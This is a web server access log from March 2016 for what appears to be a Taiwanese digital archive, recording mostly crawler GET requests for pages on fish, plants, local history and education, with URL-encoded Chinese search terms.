66.249.69.87 - - [30/Mar/2016:14:09:14 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%A4%A7%E6%96%91+%E5%A4%A7%E6%96%91%E9%A6%AC+%E5%B0%91%E5%A5%B3%E9%AD%9A+%E6%96%91%E9%A6%AC+%E8%9D%B4%E8%9D%B6%E9%AD%9A+%E8%9D%B4%E8%9D%B6%E9%AD%9A%E7%A7%91+%E8%A4%90%E5%B8%B6+%E8%A4%90%E5%B8%B6%E5%B0%91%E5%A5%B3%E9%AD%9A+&oid=15528 HTTP/1.1" 200 3724
66.249.69.187 - - [30/Mar/2016:14:09:18 +0800] "GET /content/repository/resource_content.jsp?oid=4354165&queryType=qs&queryString=%E7%9B%B2%E9%B0%BB HTTP/1.1" 200 34089
66.249.69.87 - - [30/Mar/2016:14:09:18 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%A4%A7%E6%96%91%20%E5%A4%A7%E6%96%91%E9%A6%AC%20%E5%B0%91%E5%A5%B3%E9%AD%9A%20%E6%96%91%E9%A6%AC%20%E8%9D%B4%E8%9D%B6%E9%AD%9A%20%E8%9D%B4%E8%9D%B6%E9%AD%9A%E7%A7%91%20%E8%A4%90%E5%B8%B6%20%E8%A4%90%E5%B8%B6%E5%B0%91%E5%A5%B3%E9%AD%9A%20&oid=15528 HTTP/1.1" 200 3724
66.249.69.182 - - [30/Mar/2016:14:09:52 +0800] "GET /content/repository/resource_content.jsp?oid=2631242&queryType=qs&queryString=%E9%AB%98%E8%87%BA%E7%87%9F HTTP/1.1" 200 29245
66.249.69.9 - - [30/Mar/2016:14:10:00 +0800] "GET /content/repository/resource_content.jsp?oid=1610007 HTTP/1.1" 200 28563
66.249.69.87 - - [30/Mar/2016:14:10:44 +0800] "GET /digiarch3/content/repository/resource_content.jsp?oid=1782202&queryString=%E7%A5%88%E7%A6%B1%E7%AE%B1%20%E7%A5%AD%E5%84%80 HTTP/1.1" 200 29604
66.249.69.110 - - [30/Mar/2016:14:11:28 +0800] "GET /content/subject/resource_content.jsp?oid=16777764&queryType=qs&queryString=%E6%9D%B1%E5%8C%97%E5%AD%A3%E9%A2%A8 HTTP/1.1" 200 40759
66.249.69.9 - - [30/Mar/2016:14:11:56 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%89%E4%B8%83%E8%8D%89%E5%B1%AC+%E6%A4%8D%E7%89%A9%E7%95%8C+%E7%99%BD%E9%B3%B3%E8%8F%9C+%E8%8F%8A%E7%A7%91+%E9%9B%99%E5%AD%90%E8%91%89%E6%A4%8D%E7%89%A9+&oid=1107429 HTTP/1.1" 200 3335
66.249.69.87 - - [30/Mar/2016:14:13:37 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%9C%93%E7%9C%BC%E4%BB%94+%E8%84%82%E7%9C%BC%E9%AF%A1+%E9%AF%A1%E7%A7%91+&oid=4351946 HTTP/1.1" 200 3333
66.249.69.25 - - [30/Mar/2016:14:13:40 +0800] "GET /content/repository/resource_content.jsp?oid=753512 HTTP/1.1" 200 28968
66.249.69.87 - - [30/Mar/2016:14:13:41 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%9C%93%E7%9C%BC%E4%BB%94%20%E8%84%82%E7%9C%BC%E9%AF%A1%20%E9%AF%A1%E7%A7%91%20&oid=4351946 HTTP/1.1" 200 3333
66.249.69.65 - - [30/Mar/2016:14:13:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%AD%B8%E6%95%99%E8%82%B2+%E4%B9%9D%E5%B9%B4%E5%9C%8B%E6%B0%91%E6%95%99%E8%82%B2+%E4%BB%A3%E8%AA%B2%E6%95%99%E5%B8%AB+%E5%87%BA%E7%89%88%E5%93%81+%E5%9C%8B%E6%B0%91%E4%B8%AD%E5%AD%B8+%E5%9C%8B%E6%B0%91%E4%B8%AD%E5%B0%8F%E5%AD%B8+%E5%9C%8B%E6%B0%91%E6%95%99%E8%82%B2+%E5%AD%B8%E9%BD%A1%E5%85%92%E7%AB%A5+%E5%B8%AB%E7%AF%84%E6%95%99%E8%82%B2+%E5%B8%B8%E6%85%8B%E7%B7%A8%E7%8F%AD+%E6%80%A7%E6%95%99%E8%82%B2+%E6%95%99%E8%82%B2%E5%BB%B3+%E6%B0%91%E4%B8%BB%E6%94%BF%E6%B2%BB+%E6%B6%88%E9%98%B2%E6%A0%93+%E6%BA%AA%E6%B9%96%E9%8E%AE+%E7%95%A2%E6%A5%AD%E7%94%9F+%E7%A4%BE%E6%95%99%E6%A9%9F%E6%A7%8B+%E7%A4%BE%E6%9C%83%E8%AE%8A%E9%81%B7+%E7%A6%8F%E9%9F%B3+%E7%B6%9C%E5%90%88%E6%89%80%E5%BE%97%E7%A8%85+%E8%87%BA%E5%8F%A3+%E8%87%BA%E7%81%A3%E5%9C%B0%E5%8D%80+%E8%96%AA%E6%B4%A5+%E9%97%9C%E8%AA%AA+%E9%9D%92%E5%B0%91%E5%B9%B4+%E9%AB%94%E8%82%B2+%E9%AB%94%E8%82%B2%E6%95%99%E5%AD%B8+&oid=1593282 HTTP/1.1" 200 4672
61.63.123.143 - - [30/Mar/2016:14:13:59 +0800] "GET /content/subject/resource_content.jsp?oid=16777736&queryType=qc HTTP/1.1" 200 43177
66.249.69.17 - - [30/Mar/2016:14:14:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B7%9D%E4%B8%8A%E7%9F%AD%E6%9F%84%E8%8D%89+%E7%9F%AD%E6%9F%84%E8%8D%89%E5%B1%AC+&oid=1111068 HTTP/1.1" 200 3232
61.63.123.143 - - [30/Mar/2016:14:14:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8D%97%E6%B9%96%E5%A4%A7%E5%B1%B1+%E6%9D%9C%E9%B5%91+%E7%8E%89%E5%B1%B1%E6%9D%9C%E9%B5%91+%E7%B4%B0%E8%91%89%E6%9D%9C%E9%B5%91+%E8%A5%BF%E6%96%BD%E8%8A%B1+&oid=16777736 HTTP/1.1" 200 5052
66.249.69.17 - - [30/Mar/2016:14:14:01 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%B7%9D%E4%B8%8A%E7%9F%AD%E6%9F%84%E8%8D%89%20%E7%9F%AD%E6%9F%84%E8%8D%89%E5%B1%AC%20&oid=1111068 HTTP/1.1" 200 3232
66.249.75.143 - - [30/Mar/2016:14:14:24 +0800] "GET /content/repository/resource_content.jsp?oid=3821465&queryType=qs&queryString=%E9%87%91%E4%B8%8D%E6%8F%9B HTTP/1.1" 200 31298
66.249.75.251 - - [30/Mar/2016:14:15:03 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%A4%AA%E6%B8%85%E9%81%93%E5%BE%B7%E5%A4%A9%E5%B0%8A%20&oid=4364314 HTTP/1.1" 200 2790
66.249.75.135 - - [30/Mar/2016:14:15:08 +0800] "GET /content/subject/resource_content.jsp?oid=16777330&queryType=qs&queryString=%E5%BA%AD%E9%99%A2 HTTP/1.1" 200 30520
66.249.69.17 - - [30/Mar/2016:14:15:54 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%8B%E6%B7%A1%E6%B0%B4%E6%BA%AA+%E5%9C%B0%E6%96%B9%E6%B0%91%E6%84%8F%E4%BB%A3%E8%A1%A8+%E5%B1%B1%E5%9C%B0%E9%84%89+%E5%BB%BA%E8%A8%AD%E5%BB%B3+%E7%B8%A3%E6%94%BF%E5%BA%9C+%E8%87%AA%E4%BE%86%E6%B0%B4+%E8%90%AC%E4%B8%B9+%E9%99%B3%E6%8C%AF%E8%8C%82+%E9%9C%A7%E8%87%BA+&oid=1543084 HTTP/1.1" 200 6493
66.249.69.25 - - [30/Mar/2016:14:15:57 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%8B%E6%B7%A1%E6%B0%B4%E6%BA%AA%20%E5%9C%B0%E6%96%B9%E6%B0%91%E6%84%8F%E4%BB%A3%E8%A1%A8%20%E5%B1%B1%E5%9C%B0%E9%84%89%20%E5%BB%BA%E8%A8%AD%E5%BB%B3%20%E7%B8%A3%E6%94%BF%E5%BA%9C%20%E8%87%AA%E4%BE%86%E6%B0%B4%20%E8%90%AC%E4%B8%B9%20%E9%99%B3%E6%8C%AF%E8%8C%82%20%E9%9C%A7%E8%87%BA%20&oid=1543084 HTTP/1.1" 200 6493
66.249.69.65 - - [30/Mar/2016:14:16:36 +0800] "GET /content/subject/resource_content.jsp?oid=16777304&queryType=qc HTTP/1.1" 200 36239
66.249.69.182 - - [30/Mar/2016:14:17:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E6%9D%B1%E8%B7%AF+%E4%BA%BA%E5%90%8D%E6%AC%8A%E5%A8%81+%E5%BC%B5%E4%BD%9C%E9%9C%96+%E9%83%AD%E5%AE%97%E7%86%99+%E9%AE%91%E8%B2%B4%E5%8D%BF+&oid=686327 HTTP/1.1" 200 3303
66.249.69.182 - - [30/Mar/2016:14:17:02 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E6%9D%B1%E8%B7%AF%20%E4%BA%BA%E5%90%8D%E6%AC%8A%E5%A8%81%20%E5%BC%B5%E4%BD%9C%E9%9C%96%20%E9%83%AD%E5%AE%97%E7%86%99%20%E9%AE%91%E8%B2%B4%E5%8D%BF%20&oid=686327 HTTP/1.1" 200 3303
66.249.75.143 - - [30/Mar/2016:14:17:20 +0800] "GET /content/repository/resource_content.jsp?oid=15275&queryString=%E6%9B%B3%E7%B5%B2%20%E6%9B%B3%E7%B5%B2%E9%B0%8F HTTP/1.1" 200 34478
66.249.69.9 - - [30/Mar/2016:14:18:04 +0800] "GET /content/subject/resource_content.jsp?oid=16777488&queryType=qs&queryString=%E8%A3%B8%E8%83%B8%E9%AF%99 HTTP/1.1" 200 60794
61.135.248.174 - - [30/Mar/2016:14:18:32 +0800] "GET /content/subject/resource_content.jsp?oid=16777607&queryType=qc HTTP/1.1" 200 55064
66.249.69.17 - - [30/Mar/2016:14:18:48 +0800] "GET /content/subject/resource_content.jsp?oid=16797291&queryType=qc HTTP/1.1" 200 51028
66.249.69.17 - - [30/Mar/2016:14:18:49 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BF%9D%E7%95%99%E5%9C%B0+%E5%98%89%E7%BE%A9%E7%B8%A3%E8%AD%B0%E6%9C%83+%E8%80%95%E8%80%85%E6%9C%89%E5%85%B6%E7%94%B0+%E8%87%BA%E7%B3%96+%E8%BE%B2%E6%9E%97%E9%A1%9E+&oid=1552054 HTTP/1.1" 200 4297
66.249.69.9 - - [30/Mar/2016:14:18:54 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BF%9D%E7%95%99%E5%9C%B0%20%E5%98%89%E7%BE%A9%E7%B8%A3%E8%AD%B0%E6%9C%83%20%E8%80%95%E8%80%85%E6%9C%89%E5%85%B6%E7%94%B0%20%E8%87%BA%E7%B3%96%20%E8%BE%B2%E6%9E%97%E9%A1%9E%20&oid=1552054 HTTP/1.1" 200 4297
66.249.69.9 - - [30/Mar/2016:14:19:34 +0800] "GET /digiarch_en/content/repository/resource_content.jsp?oid=15101&queryString=%E5%9A%B4%E5%85%AC%E4%BB%94%20%E5%A4%A7%E7%9C%BC%E9%AF%9B%20%E5%A4%A7%E7%9C%BC%E9%AF%9B%E7%A7%91%20%E7%B4%85%E7%9B%AE%E9%B0%B1 HTTP/1.1" 200 28559
66.249.69.9 - - [30/Mar/2016:14:19:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%83%E8%AD%B0%E6%9C%83+%E5%8F%B0%E7%81%A3%E7%9C%81+%E8%99%95%E9%95%B7+%E8%AD%A6%E5%8B%99%E8%99%95+%E8%AD%B0%E9%95%B7+%E9%99%B3%E5%8F%8B%E6%AC%BD+&oid=1515903 HTTP/1.1" 200 5784
220.130.16.151 - - [30/Mar/2016:14:19:46 +0800] "GET /content/subject/resource_content.jsp?oid=16777479 HTTP/1.1" 200 35789
220.130.16.151 - - [30/Mar/2016:14:19:47 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%BE%9B%E5%A4%B7+&oid=16777479 HTTP/1.1" 200 1412
66.249.69.9 - - [30/Mar/2016:14:20:05 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B3%A5%E9%B0%8D+&oid=3339749 HTTP/1.1" 200 3415
66.249.69.9 - - [30/Mar/2016:14:20:07 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B3%A5%E9%B0%8D%20&oid=3339749 HTTP/1.1" 200 3415
66.249.69.118 - - [30/Mar/2016:14:20:15 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777836&queryType=qc HTTP/1.1" 302 -
66.249.69.9 - - [30/Mar/2016:14:20:25 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%B4%99%E5%BA%AB+%E9%BB%83%E9%BE%8D+&oid=2675552 HTTP/1.1" 200 3338
66.249.69.9 - - [30/Mar/2016:14:20:27 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%B4%99%E5%BA%AB%20%E9%BB%83%E9%BE%8D%20&oid=2675552 HTTP/1.1" 200 3338
66.249.69.102 - - [30/Mar/2016:14:20:49 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%AE%97%E5%AE%A4+%E7%A7%BB%E6%9C%83+&oid=2674600 HTTP/1.1" 200 3120
66.249.69.102 - - [30/Mar/2016:14:20:51 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%AE%97%E5%AE%A4%20%E7%A7%BB%E6%9C%83%20&oid=2674600 HTTP/1.1" 200 3120
66.249.69.57 - - [30/Mar/2016:14:21:00 +0800] "GET /content/subject/resource_content.jsp?oid=16777297&queryType=qc HTTP/1.1" 200 31731
117.19.80.20 - - [30/Mar/2016:14:21:24 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%99%BD%E5%8D%83%E5%B1%A4+&oid=16777287 HTTP/1.1" 200 3852
220.133.58.196 - - [30/Mar/2016:14:21:45 +0800] "GET /content/subject/resource_content.jsp?oid=16777736&queryType=qc HTTP/1.1" 200 43177
220.133.58.196 - - [30/Mar/2016:14:21:46 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8D%97%E6%B9%96%E5%A4%A7%E5%B1%B1+%E6%9D%9C%E9%B5%91+%E7%8E%89%E5%B1%B1%E6%9D%9C%E9%B5%91+%E7%B4%B0%E8%91%89%E6%9D%9C%E9%B5%91+%E8%A5%BF%E6%96%BD%E8%8A%B1+&oid=16777736 HTTP/1.1" 200 5052
66.249.69.9 - - [30/Mar/2016:14:22:29 +0800] "GET /content/subject/resource_content.jsp?oid=16777433&queryType=qs&queryString=%E7%A6%8F%E7%88%BE%E6%91%A9%E8%8E%8E HTTP/1.1" 200 28530
66.249.69.192 - - [30/Mar/2016:14:22:31 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%AD%E5%BA%9C%20%E5%88%A9%E8%88%88%20&oid=1555219 HTTP/1.1" 200 3734
68.180.230.90 - - [30/Mar/2016:14:22:34 +0800] "GET /content/repository/resource_content.jsp?oid=1608322 HTTP/1.1" 200 45034
66.249.75.251 - - [30/Mar/2016:14:22:46 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%97%A5%E6%9C%AC%E7%81%B0%E9%AE%AB+%E6%B2%99%E6%A2%9D+%E7%BF%85%E6%B2%99+&oid=14085 HTTP/1.1" 200 3431
66.249.69.182 - - [30/Mar/2016:14:23:12 +0800] "GET /content/subject/resource_content.jsp?oid=16797239&queryType=qc HTTP/1.1" 200 44010
66.249.69.17 - - [30/Mar/2016:14:23:56 +0800] "GET /content/repository/resource_content.jsp?oid=4739373&queryString=%E7%A5%AD%E5%84%80%20%E9%BB%83%E9%80%B2 HTTP/1.1" 200 30769
66.249.69.25 - - [30/Mar/2016:14:23:57 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%AF%9B%E8%93%AE%E5%AD%90%E8%8D%89+%E7%9F%B3%E7%AB%B9+%E8%8E%A7%E7%A7%91+%E8%93%AE%E5%AD%90+%E8%93%AE%E5%AD%90%E8%8D%89%E5%B1%AC+&oid=1110789 HTTP/1.1" 200 3399
66.249.69.17 - - [30/Mar/2016:14:24:06 +0800] "GET /content/repository/resource_content.jsp?oid=1605728 HTTP/1.1" 200 28513
66.249.75.251 - - [30/Mar/2016:14:24:42 +0800] "GET /content/subject/resource_content.jsp?oid=16777446&queryType=qc HTTP/1.1" 200 42198
66.249.69.17 - - [30/Mar/2016:14:24:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%A5%93%E6%A8%B9%E5%B1%AC+%E6%A7%AD%E6%A8%B9%E7%A7%91+%E7%84%A1%E6%82%A3%E5%AD%90+%E9%9D%92%E6%A5%93+&oid=1107321 HTTP/1.1" 200 4069
66.249.69.118 - - [30/Mar/2016:14:25:24 +0800] "GET /content/subject/resource_content.jsp?oid=16777381&queryType=qc HTTP/1.1" 200 37140
66.249.75.143 - - [30/Mar/2016:14:25:34 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%81%87%E5%90%AB%E7%BE%9E%E8%8D%89+%E5%B1%B1%E6%89%81%E8%B1%86+%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%B1%BA%E6%98%8E%E5%B1%AC+%E8%A0%B6%E8%B1%86+%E9%9B%99%E5%AD%90%E8%91%89%E6%A4%8D%E7%89%A9+&oid=2145984 HTTP/1.1" 200 3463
8.37.235.77 - - [30/Mar/2016:14:26:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E7%81%A3%E6%AC%92%E6%A8%B9+%E8%8B%A6%E8%8B%93%E8%88%85+&oid=16777254 HTTP/1.1" 200 4285
66.249.69.25 - - [30/Mar/2016:14:26:08 +0800] "GET /content/repository/resource_content.jsp?oid=3824672&queryString=%E5%A4%A7%E8%91%89%E5%B1%B1%20%E5%A4%A7%E8%91%89%E5%B1%B1%E6%AC%96%20%E5%B1%B1%E6%AC%96 HTTP/1.1" 200 31538
66.249.69.17 - - [30/Mar/2016:14:26:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A5%8A%E9%9B%B2%E8%90%8D+%E6%AF%98%E9%99%B5+%E7%95%AA%E7%A4%BE+%E9%87%91%E9%97%9C%E4%B8%88%E5%A4%AB+%E9%9B%9C%E8%A9%A9+&oid=2470177 HTTP/1.1" 200 3433
66.249.69.9 - - [30/Mar/2016:14:26:47 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A5%8A%E9%9B%B2%E8%90%8D%20%E6%AF%98%E9%99%B5%20%E7%95%AA%E7%A4%BE%20%E9%87%91%E9%97%9C%E4%B8%88%E5%A4%AB%20%E9%9B%9C%E8%A9%A9%20&oid=2470177 HTTP/1.1" 200 3433
66.249.69.17 - - [30/Mar/2016:14:26:52 +0800] "GET /content/subject/resource_content.jsp?oid=16777426 HTTP/1.1" 200 38877
27.246.137.96 - - [30/Mar/2016:14:27:02 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:27:03 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
66.249.69.9 - - [30/Mar/2016:14:27:36 +0800] "GET /content/repository/resource_content.jsp?oid=1882863 HTTP/1.1" 200 28520
66.249.75.251 - - [30/Mar/2016:14:27:48 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B3%B0%E9%9B%85%E6%97%8F+%E9%A0%AD%E9%A3%BE+%E9%A0%AD%E9%A3%BE%E5%B8%B6+&oid=1783379 HTTP/1.1" 200 3830
66.249.75.135 - - [30/Mar/2016:14:27:52 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B3%B0%E9%9B%85%E6%97%8F%20%E9%A0%AD%E9%A3%BE%20%E9%A0%AD%E9%A3%BE%E5%B8%B6%20&oid=1783379 HTTP/1.1" 200 3830
66.249.75.143 - - [30/Mar/2016:14:28:20 +0800] "GET /content/repository/resource_content.jsp?oid=1173481&queryString=%E8%B7%B3%E8%8A%B1%20%E9%9D%92%E8%8B%97 HTTP/1.1" 200 29627
66.249.75.251 - - [30/Mar/2016:14:28:24 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%9B%94%E5%B8%BD+&oid=4364071 HTTP/1.1" 200 2996
27.246.137.96 - - [30/Mar/2016:14:28:28 +0800] "GET /content/repository/resource_content.jsp?oid=1555942 HTTP/1.1" 200 30482
27.246.137.96 - - [30/Mar/2016:14:28:30 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%A5%E5%AD%B8%E8%80%83%E8%A9%A6+%E5%91%82%E9%8C%A6%E8%8A%B1+%E5%9C%8B%E6%A0%A1+%E5%9C%8D%E6%A8%99+%E5%A2%9E%E5%BB%BA+%E5%AE%B6%E9%95%B7%E6%9C%83+%E6%83%A1%E6%80%A7%E8%A3%9C%E7%BF%92+%E6%95%99%E6%9D%90+%E7%9F%A5%E6%96%B0+%E7%AE%97%E8%A1%93+%E8%B3%AA%E8%A9%A2+&oid=1555942 HTTP/1.1" 200 3866
27.246.137.96 - - [30/Mar/2016:14:28:31 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:28:32 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
27.246.137.96 - - [30/Mar/2016:14:28:35 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
27.246.137.96 - - [30/Mar/2016:14:28:36 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%95%86%E8%81%B7+%E5%9C%8B%E6%A0%A1+%E5%AD%B8%E9%9B%9C%E8%B2%BB+%E6%83%A1%E6%80%A7%E8%A3%9C%E7%BF%92+%E6%B2%99%E9%B9%BF+%E8%87%BA%E4%B8%AD%E7%B8%A3+%E8%A3%9C%E7%BF%92%E7%8F%AD+%E9%AB%98%E9%9B%84%E7%B8%A3%E7%BE%8E%E6%BF%83%E9%8E%AE+&oid=1566551 HTTP/1.1" 200 4624
27.246.137.96 - - [30/Mar/2016:14:28:36 +0800] "HEAD /content/repository/resource_content.jsp?oid=1555942 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:28:37 +0800] "GET /content/repository/resource_content.jsp?oid=1555942 HTTP/1.1" 200 30482
66.249.75.251 - - [30/Mar/2016:14:29:04 +0800] "GET /content/subject/resource_content.jsp?oid=16777396&queryType=qc HTTP/1.1" 200 34862
66.249.69.17 - - [30/Mar/2016:14:29:05 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%96%91%E8%8A%B1%E9%9D%92%E7%89%9B%E8%86%BD+%E6%A4%8D%E7%89%A9%E7%95%8C+%E8%8F%AB%E8%8F%9C+%E8%91%AB%E8%98%86%E7%A7%91+%E9%9D%92%E7%89%9B%E8%86%BD%E5%B1%AC+&oid=1104336 HTTP/1.1" 200 3400
66.249.69.9 - - [30/Mar/2016:14:29:07 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%96%91%E8%8A%B1%E9%9D%92%E7%89%9B%E8%86%BD%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E8%8F%AB%E8%8F%9C%20%E8%91%AB%E8%98%86%E7%A7%91%20%E9%9D%92%E7%89%9B%E8%86%BD%E5%B1%AC%20&oid=1104336 HTTP/1.1" 200 3400
163.29.253.102 - - [30/Mar/2016:14:29:47 +0800] "GET /content/repository/resource_content.jsp?oid=1531020 HTTP/1.1" 200 29328
163.29.253.102 - - [30/Mar/2016:14:29:48 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%BC%81%E6%9C%83+%E6%BE%8E%E6%B9%96%E7%B8%A3+%E7%B8%A3%E8%BD%84%E5%B8%82+%E8%87%BA%E7%81%A3%E7%9C%81+%E8%87%BA%E7%81%A3%E7%9C%81%E6%94%BF%E5%BA%9C+&oid=1531020 HTTP/1.1" 200 4558
66.249.75.143 - - [30/Mar/2016:14:30:34 +0800] "GET /content/subject/resource_content.jsp?oid=16777273&queryType=qs&queryString=%E6%9D%B1%E5%91%A8 HTTP/1.1" 200 38398
218.161.46.33 - - [30/Mar/2016:14:30:59 +0800] "GET /content/subject/resource_content.jsp?oid=16777706 HTTP/1.1" 200 53849
218.161.46.33 - - [30/Mar/2016:14:31:00 +0800] "GET /content/subject/resource_content.jsp?oid=16777728 HTTP/1.1" 200 65177
218.161.46.33 - - [30/Mar/2016:14:31:01 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%A0%A1%E5%9C%96+&oid=16777706 HTTP/1.1" 200 2864
218.161.46.33 - - [30/Mar/2016:14:31:01 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777728 HTTP/1.1" 200 1405
66.249.69.17 - - [30/Mar/2016:14:31:10 +0800] "GET /content/repository/resource_content.jsp?oid=1843838 HTTP/1.1" 200 31312
66.249.69.87 - - [30/Mar/2016:14:31:16 +0800] "GET /digiarch3/content/subject/resource_content.jsp?oid=16777342&queryType=qc HTTP/1.1" 200 33226
27.246.137.96 - - [30/Mar/2016:14:31:58 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:32:00 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
66.249.69.87 - - [30/Mar/2016:14:32:00 +0800] "GET /digiarch3/content/subject/resource_content.jsp?oid=16777396&queryType=qc HTTP/1.1" 200 34853
66.249.69.17 - - [30/Mar/2016:14:32:28 +0800] "GET /content/repository/resource_content.jsp?oid=1895781 HTTP/1.1" 200 28728
27.246.137.96 - - [30/Mar/2016:14:32:30 +0800] "HEAD /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 -
27.246.137.96 - - [30/Mar/2016:14:32:32 +0800] "GET /content/repository/resource_content.jsp?oid=1566551 HTTP/1.1" 200 30170
66.249.75.143 - - [30/Mar/2016:14:32:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%89%8D%E8%82%9B%E9%B0%BB+%E7%AE%AD%E9%BD%92%E5%89%8D%E8%82%9B%E9%B0%BB+%E8%82%9B%E9%B0%BB+&oid=16777421 HTTP/1.1" 200 3816
66.249.75.251 - - [30/Mar/2016:14:33:47 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%AD%97%E5%A5%8F%E6%91%BA+&oid=2660286 HTTP/1.1" 200 3123
66.249.75.251 - - [30/Mar/2016:14:33:49 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%AD%97%E5%A5%8F%E6%91%BA%20&oid=2660286 HTTP/1.1" 200 3123
220.181.108.113 - - [30/Mar/2016:14:34:07 +0800] "GET /content/subject/resource_content.jsp?oid=16777487&queryType=qc HTTP/1.1" 200 45195
66.249.75.251 - - [30/Mar/2016:14:34:12 +0800] "GET /content/repository/resource_content.jsp?oid=1781445&queryString=%E5%A4%A7%E8%91%89%E5%B1%B1%E6%AC%96%20%E6%8B%BC%E6%9D%BF%E8%88%9F%20%E9%81%94%E6%82%9F%E6%97%8F HTTP/1.1" 200 28859
40.77.167.7 - - [30/Mar/2016:14:34:42 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16777585 HTTP/1.1" 200 1405
66.249.69.17 - - [30/Mar/2016:14:34:56 +0800] "GET /content/repository/resource_content.jsp?oid=1523270 HTTP/1.1" 200 29077
66.249.69.9 - - [30/Mar/2016:14:35:05 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BA%94%E5%8A%A0%E7%A7%91+%E6%A4%8D%E7%89%A9%E7%95%8C+%E9%B5%9D%E6%8E%8C%E6%9F%B4%E5%B1%AC+%E9%B5%9D%E6%8E%8C%E8%98%97+&oid=1104958 HTTP/1.1" 200 3359
66.249.69.9 - - [30/Mar/2016:14:35:07 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BA%94%E5%8A%A0%E7%A7%91%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E9%B5%9D%E6%8E%8C%E6%9F%B4%E5%B1%AC%20%E9%B5%9D%E6%8E%8C%E8%98%97%20&oid=1104958 HTTP/1.1" 200 3359
66.249.75.135 - - [30/Mar/2016:14:36:24 +0800] "GET /content/repository/resource_content.jsp?oid=4363138&queryString=%E7%A5%9E%E5%92%92 HTTP/1.1" 200 28542
66.249.75.251 - - [30/Mar/2016:14:36:44 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%AD%E6%96%91%E4%BA%8C%E9%BD%92%E9%AD%A8+%E5%85%AD%E6%96%91%E5%88%BA%E9%AD%A8+%E5%88%BA%E8%A6%8F+%E5%88%BA%E9%AD%A8+%E6%B0%A3%E7%90%83+%E6%B0%A3%E7%93%9C%E4%BB%94+%E7%93%9C%E4%BB%94+%E9%AD%A8%E7%A7%91+&oid=16558 HTTP/1.1" 200 3784
66.249.75.251 - - [30/Mar/2016:14:36:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%85%AD%E6%96%91%E4%BA%8C%E9%BD%92%E9%AD%A8%20%E5%85%AD%E6%96%91%E5%88%BA%E9%AD%A8%20%E5%88%BA%E8%A6%8F%20%E5%88%BA%E9%AD%A8%20%E6%B0%A3%E7%90%83%20%E6%B0%A3%E7%93%9C%E4%BB%94%20%E7%93%9C%E4%BB%94%20%E9%AD%A8%E7%A7%91%20&oid=16558 HTTP/1.1" 200 3784
